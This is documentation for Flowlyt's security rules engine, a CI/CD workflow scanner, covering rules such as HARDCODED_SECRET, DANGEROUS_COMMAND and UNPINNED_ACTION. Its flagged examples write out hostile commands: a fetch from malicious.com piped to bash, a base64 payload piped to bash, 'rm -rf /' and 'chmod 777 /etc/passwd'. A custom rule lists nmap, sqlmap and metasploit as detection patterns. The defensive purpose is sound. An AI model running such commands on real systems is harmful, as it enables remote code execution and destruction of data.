# Security Rules Engine

Flowlyt's security rules engine is the core component that analyzes CI/CD workflows to detect security vulnerabilities, misconfigurations, and malicious patterns.

## Overview

The rules engine provides:
- **30+ built-in security rules** covering common CI/CD threats
- **Configurable rule management** (enable/disable specific rules)
- **Severity-based filtering** (CRITICAL, HIGH, MEDIUM, LOW, INFO)
- **Platform-specific adaptations** for GitHub Actions and GitLab CI/CD
- **Extensible architecture** for custom rule development

## Built-in Security Rules

### Critical Severity Rules

#### `HARDCODED_SECRET`
**What it detects:** Hardcoded secrets, API keys, tokens, and credentials in workflow files.

**Why it's critical:** Exposed secrets can lead to unauthorized access to systems, data breaches, and supply chain attacks.

**Examples:**
```yaml
# ❌ CRITICAL: Hardcoded secret
env:
  API_KEY: "sk-1234567890abcdef"
  DATABASE_PASSWORD: "super_secret_password"
  GITHUB_TOKEN: "ghp_xxxxxxxxxxxxxxxxxxxx"

# ✅ GOOD: Using secrets
env:
  API_KEY: ${{ secrets.API_KEY }}
  DATABASE_PASSWORD: ${{ secrets.DB_PASSWORD }}
  GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

**Remediation:**
- Use CI/CD platform's secret management (GitHub Secrets, GitLab Variables)
- Store sensitive data in external secret management systems
- Never commit secrets to version control

#### `MALICIOUS_BASE64_DECODE`
**What it detects:** Base64 decode operations that might be used to obfuscate malicious commands.

**Why it's critical:** Attackers often use base64 encoding to hide malicious payloads and bypass static analysis.

**Examples:**
```yaml
# ❌ CRITICAL: Suspicious base64 decode
run: |
  echo "ZWNobyAiaGVsbG8gd29ybGQi" | base64 -d | bash
  echo $ENCODED_COMMAND | base64 --decode | sh

# ✅ GOOD: Legitimate base64 usage
run: |
  echo "config data" | base64 > config.b64
  kubectl create secret generic mysecret --from-literal=config="$(echo 'data' | base64)"
```

**Remediation:**
- Avoid base64 encoding/decoding in CI/CD scripts
- Use plain text commands for transparency
- If base64 is necessary, document the purpose clearly

### High Severity Rules

#### `INSECURE_PULL_REQUEST_TARGET`
**What it detects:** Usage of `pull_request_target` trigger in GitHub Actions, which can be dangerous.

**Why it's high risk:** `pull_request_target` runs with write permissions and can be exploited by malicious pull requests.

**Examples:**
```yaml
# ❌ HIGH RISK: Dangerous trigger
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Dangerous!

# ✅ SAFER: Use pull_request instead
on:
  pull_request:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
```

**Remediation:**
- Use `pull_request` instead of `pull_request_target` when possible
- If `pull_request_target` is necessary, avoid checking out PR code
- Implement proper approval workflows for external contributions

#### `BROAD_PERMISSIONS`
**What it detects:** Overly broad permissions in GitHub Actions workflows.

**Why it's high risk:** Excessive permissions violate the principle of least privilege and increase attack surface.

**Examples:**
```yaml
# ❌ HIGH RISK: Overly broad permissions
permissions: write-all

# ❌ HIGH RISK: Too many permissions
permissions:
  contents: write
  packages: write
  issues: write
  pull-requests: write
  deployments: write

# ✅ GOOD: Minimal permissions
permissions:
  contents: read
  packages: read

# ✅ GOOD: Specific permissions only
permissions:
  contents: read
  packages: write  # Only what's needed for this job
```

**Remediation:**
- Follow principle of least privilege
- Grant only the minimum permissions required
- Use job-level permissions instead of workflow-level when possible

#### `DANGEROUS_COMMAND`
**What it detects:** Potentially dangerous shell commands that could be exploited.

**Why it's high risk:** Dangerous commands can lead to system compromise, data exfiltration, or supply chain attacks.

**Examples:**
```yaml
# ❌ HIGH RISK: Dangerous commands
run: |
  curl -s https://malicious.com/script.sh | bash
  wget -O - https://install.sh | sh
  eval "$UNTRUSTED_INPUT"
  rm -rf /
  chmod 777 /etc/passwd

# ✅ GOOD: Safe alternatives
run: |
  curl -s https://trusted.com/script.sh > script.sh
  sha256sum script.sh | grep expected_hash
  bash script.sh
```

**Remediation:**
- Avoid piping downloads directly to shell interpreters
- Verify integrity of downloaded files
- Use specific commands instead of dangerous operations

#### `SHELL_EVAL_USAGE`
**What it detects:** Usage of `eval` in shell commands, which can execute arbitrary code.

**Why it's high risk:** `eval` can execute untrusted input as code, leading to command injection.

**Examples:**
```yaml
# ❌ HIGH RISK: Using eval
run: |
  eval "$USER_INPUT"
  eval "$(curl -s https://api.example.com/command)"

# ✅ GOOD: Direct command execution
run: |
  if [ "$USER_INPUT" = "deploy" ]; then
    ./deploy.sh
  fi
```

**Remediation:**
- Never use `eval` with untrusted input
- Use conditional statements instead
- Validate and sanitize all external input

### Medium Severity Rules

#### `UNPINNED_ACTION`
**What it detects:** GitHub Actions that are not pinned to specific commit SHAs.

**Why it's medium risk:** Unpinned actions can be updated maliciously or introduce breaking changes.

**Examples:**
```yaml
# ❌ MEDIUM RISK: Unpinned actions
steps:
  - uses: actions/checkout@v4           # Version tag
  - uses: actions/setup-node@latest     # Latest tag
  - uses: third-party/action@main       # Branch reference

# ✅ GOOD: Pinned to commit SHA
steps:
  - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608
  - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8
```

**Remediation:**
- Pin all actions to specific commit SHAs
- Use tools like Dependabot to keep actions updated
- For official actions, version tags are acceptable

#### `CONTINUE_ON_ERROR_CRITICAL_JOB`
**What it detects:** Critical jobs that continue execution even when security checks fail.

**Why it's medium risk:** Ignoring security check failures can lead to deployment of vulnerable code.

**Examples:**
```yaml
# ❌ MEDIUM RISK: Ignoring security failures
jobs:
  security-scan:
    runs-on: ubuntu-latest
    continue-on-error: true  # Bad for security jobs
    steps:
      - name: Security Scan
        run: security-scanner

  deploy:
    needs: security-scan
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: deploy.sh

# ✅ GOOD: Fail fast on security issues
jobs:
  security-scan:
    runs-on: ubuntu-latest
    # continue-on-error: false (default)
    steps:
      - name: Security Scan
        run: security-scanner

  deploy:
    needs: security-scan
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: deploy.sh
```

**Remediation:**
- Remove `continue-on-error: true` from security-critical jobs
- Let security failures block deployment pipeline
- Use conditional deployment based on security scan results

## Rule Configuration

### Enabling/Disabling Rules

#### Via Command Line
```bash
# Enable only specific rules
flowlyt --enable-rules HARDCODED_SECRET,MALICIOUS_BASE64_DECODE --repo .

# Disable specific rules
flowlyt --disable-rules UNPINNED_ACTION,CONTINUE_ON_ERROR_CRITICAL_JOB --repo .

# Disable all default rules and enable specific ones
flowlyt --no-default-rules --enable-rules HARDCODED_SECRET --repo .
```

#### Via Configuration File
```yaml
# .flowlyt.yml
rules:
  # Enable only these rules
  enabled:
    - "HARDCODED_SECRET"
    - "MALICIOUS_BASE64_DECODE"
    - "INSECURE_PULL_REQUEST_TARGET"
  
  # Disable these rules
  disabled:
    - "UNPINNED_ACTION"        # Using Dependabot
    - "CONTINUE_ON_ERROR_CRITICAL_JOB"  # Needed for some workflows
```

### Severity Filtering

```bash
# Show only critical and high severity issues
flowlyt --min-severity HIGH --repo .

# Show only critical issues
flowlyt --min-severity CRITICAL --repo .

# Show all issues (default)
flowlyt --min-severity LOW --repo .
```

## Advanced Rule Features

### Context-Aware Analysis

Flowlyt performs context-aware analysis to reduce false positives:

```yaml
# This is NOT flagged as HARDCODED_SECRET because it's in comments
# API_KEY=sk-1234567890  # Example key - replace with real value

# This IS flagged because it's in active code
env:
  API_KEY: sk-1234567890  # ❌ CRITICAL
```

### Multi-Pattern Detection

Rules can use multiple patterns for comprehensive detection:

```yaml
# DANGEROUS_COMMAND rule detects all of these:
run: |
  curl | bash              # Pattern 1
  wget | sh               # Pattern 2
  eval "$input"           # Pattern 3
  rm -rf /               # Pattern 4
```

### File Path Analysis

Rules consider file paths and contexts:

```yaml
# Different treatment based on file location
test/                    # More lenient rules
.github/workflows/       # Full security analysis
scripts/                 # Script-specific rules
```

## Custom Security Rules

You can extend the built-in rules with custom ones:

```yaml
# .flowlyt.yml
rules:
  custom_rules:
    - id: "COMPANY_DOCKER_POLICY"
      name: "Company Docker Image Policy"
      description: "Ensures only approved Docker images are used"
      severity: "HIGH"
      category: "POLICY_VIOLATION"
      type: "regex"
      pattern: "image:\\s*(?!company-registry\\.com/)"
      target:
        commands: true
      remediation: "Use only company-approved Docker images from company-registry.com"
    
    - id: "PROHIBITED_TOOLS"
      name: "Prohibited Security Tools"
      description: "Detects usage of prohibited security scanning tools"
      severity: "MEDIUM"
      type: "regex"
      patterns:
        - "nmap\\s+"
        - "sqlmap\\s+"
        - "metasploit"
      target:
        commands: true
      remediation: "Use company-approved security tools only"
```

## Rule Categories

Rules are organized into categories for better management:

| Category | Description | Example Rules |
|----------|-------------|---------------|
| `SECRET_EXPOSURE` | Secret and credential detection | `HARDCODED_SECRET` |
| `MALICIOUS_PATTERN` | Suspicious code patterns | `MALICIOUS_BASE64_DECODE` |
| `PERMISSION_MISCONFIGURATION` | Permission and access issues | `BROAD_PERMISSIONS` |
| `SUPPLY_CHAIN` | Supply chain security | `UNPINNED_ACTION` |
| `COMMAND_INJECTION` | Command injection vulnerabilities | `SHELL_EVAL_USAGE` |
| `WORKFLOW_SECURITY` | Workflow-specific security | `INSECURE_PULL_REQUEST_TARGET` |

## Performance Optimization

### Rule Execution Order
Rules are executed in optimized order:
1. Fast regex-based rules first
2. Complex parsing rules second  
3. Context-aware analysis last

### Parallel Processing
Multiple workflows are analyzed in parallel for better performance.

### Incremental Analysis
Flowlyt can skip unchanged files when possible:
```bash
# Only analyze changed workflows
flowlyt --incremental --repo .
```

## Integration with IDE/Editors

### VS Code Extension (Planned)
- Real-time rule checking as you type
- Inline suggestions and remediation
- Rule explanation tooltips

### Pre-commit Hooks
```bash
# Install pre-commit hook
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
flowlyt --repo . --min-severity HIGH
if [ $? -ne 0 ]; then
  echo "Security issues found. Fix them before committing."
  exit 1
fi
EOF
chmod +x .git/hooks/pre-commit
```

## Rule Development Guidelines

### Creating Effective Rules

1. **Be Specific**: Target specific patterns rather than broad categories
2. **Minimize False Positives**: Use context-aware patterns
3. **Provide Clear Remediation**: Include actionable fix instructions
4. **Test Thoroughly**: Validate against real-world workflows

### Rule Testing
```bash
# Test custom rules against sample workflows
flowlyt --config custom-rules.yml --workflow test/sample-workflow.yml
```

### Contributing Rules
We welcome contributions of new security rules:
1. Follow the rule development guidelines
2. Include test cases and documentation
3. Submit a pull request with your rule

---

**Next:** [Secret Detection](secret-detection.md)
